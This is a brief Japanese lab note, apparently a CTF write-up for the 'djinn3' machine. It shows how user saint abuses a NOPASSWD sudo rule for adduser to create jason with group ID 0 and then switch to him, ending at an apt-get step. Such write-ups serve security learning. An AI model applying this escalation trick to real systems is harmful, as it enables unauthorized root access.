権限の確認

saint@djinn3:~$ sudo -l

Matching Defaults entries for saint on djinn3:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saint may run the following commands on djinn3:

(root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin

![[横展開（saint→jason）→権限昇格 image.png]]

ユーザの追加権限

ユーザの確認

![[横展開（saint→jason）→権限昇格 image 1.png]]

jason

jasonをrootグループに追加

sudo adduser jason --gid 0

![[横展開（saint→jason）→権限昇格 image 2.png]]

ユーザをjasonに変更

su jason

![[横展開（saint→jason）→権限昇格 image 3.png]]

/usr/bin/apt-get